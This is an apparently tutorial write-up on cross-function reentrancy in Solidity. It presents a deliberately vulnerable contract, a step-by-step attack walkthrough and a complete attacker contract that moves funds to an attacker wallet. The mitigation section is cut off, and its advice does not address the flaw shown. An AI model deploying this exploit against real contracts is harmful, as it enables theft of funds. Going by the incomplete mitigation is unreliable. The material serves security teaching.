# Cross-Function Reentrancy

<hr>

`Cross-function reentrancy` can occur when two or more functions in a program share the same state variable and one or more of these functions update the variable in an insecure manner. This creates a situation where one function can be called multiple times by another function before the state changes are propagated through the program, causing unexpected behavior.

## Vulnerable Contract

<hr>

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

abstract contract ReentrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract VulnerableContract is ReentrancyGuard {
    mapping (address => uint) private balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function transfer(address _to, uint _amount) external {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        balances[_to] += _amount;
        balances[msg.sender] -= _amount;
    }

    function withdraw() external noReentrant {  
        require(balances[msg.sender] > 0, "Insufficient balance");

        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        require(success, "Transfer Failed");

        balances[msg.sender] = 0;
    }

    function getUserBalance(address _user) public view returns (uint256) {
        return balances[_user];
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
```

## Understanding the Contract

<hr>

**1. VulnerableContract:** Allows users to deposit, transfer and withdraw funds. It inherits from an ReentrancyGuard contract that implements a locking mechanism to prevent reentrancy attacks.

**2. ReentrancyGuard contract:** It uses a boolean flag called locked to ensure that no function can be re-entered while it is still executing. The noReentrant modifier defined in the ReentrancyGuard contract checks that the locked flag is false before executing the function and sets it to true. After the function has executed, it sets the locked flag back to false.

**3. deposit function:** Allows users to add funds to their account by sending Ether to the contract.

**4. transfer function:** Allows users to transfer funds from their account to another account.
  
**5. withdraw function:** It uses the call function to transfer funds to the user's address and checks whether the transfer was successful before updating the user's balance. If the transfer fails, the user's balance remains in the contract.

**6. balances:** A private mapping that maps user addresses to their account balance.

**7. getUserBalance function:** Allows users to query their current account balance.

**8. getBalance function:** Returns the current balance of the contract.

### Identifying the vulnerability

Code flow is like in withdraw function:

invoke withdraw => transfer funds => fallback function => transfer function => balance to zero.


The withdraw() function in the above code facilitates the transfer of the entire balance of the caller to their external account using the call() function. However, this call() function has the potential to trigger the fallback function of a malicious contract, giving the attacker an opportunity to run arbitrary code while within the context of the withdraw() function. 

If the fallback function of the malicious contract calls the transfer() function of the victim contract simultaneously, it could potentially transferring the funds out of their own account before setting the balance to zero in the balances state variable. Lets see in brief.

<center><img class="image" src="./assets/images/cross-function-re-entrancy.jpg"></center>
<b><center class="img-label">Vulnerability</center></b>

Step-by-step explanation of how a cross function reentrancy attack could be carried out in this Vulnerable Contract:

**1. Calling withdraw function from attacker contract:** An attacker creates a malicious contract with a fallback function that calls the `withdraw()` function of the victim contract repeatedly.

**2.** The attacker sends a request to the victim contract to execute the withdraw() function.

**3.** The victim contract begins executing the withdraw() function and checks if the caller has a positive balance.

**4.** The attacker's malicious contract triggers the fallback function and calls the transfer() function of the victim contract, while the whole execution of the withdraw function is still in progress (Note it contract is update sender balance to zero after trasfer the function so its pending state).

**5.** The attacker's contract needs to provide parameters, such as the amount to transfer and the destination address, to call the transfer() function. The amount can be less than or equal to the balance of the attacker's contract, and the destination address can be the attacker's wallet address.

**6.** The victim contract deducts the amount from the sender's (ATTACKER CONTRACT) address.

**7.** The victim contract adds the amount to the attacker's wallet address. 

**8.** Eventually, the execution state returns to the withdraw() function, and the attacker's contract's balance is set to zero.

## Examining the POC or Attacker Contract

<hr>

```sol
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.19;

interface IVulnerableContract {
    function deposit() external payable;
    function transfer(address _to, uint _amount) external;
    function withdraw() external;
    function getUserBalance(address _user) external view returns (uint);
} 

contract AttackerContract {
    IVulnerableContract public immutable vulnerableContract;
    address public walletAddress = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;

    constructor(IVulnerableContract _vulnerableContract) {
        vulnerableContract = _vulnerableContract;
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.transfer(
                walletAddress, 
                vulnerableContract.getUserBalance(address(this))
            );
        }
    }

    function initiateAttack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw();
    }

    function getBalance() external view returns (uint) {
        return address(this).balance;
    }
}
```

## Drain Whole funds
<!-- <center><img class="image" src="./assets/images/cross function re-entrancy.jpg"></center>
<b><center class="img-label">Output</center></b> -->

## mitigatation:

To mitigate this vulnerability, you can add a check at the beginning of the withdraw() function to ensure that the contract's balance is greater than or equal to the amount being withdrawn. Additionally, you can use the nonReentrant modifier to prevent reentrancy attacks.

Here's an example implementation: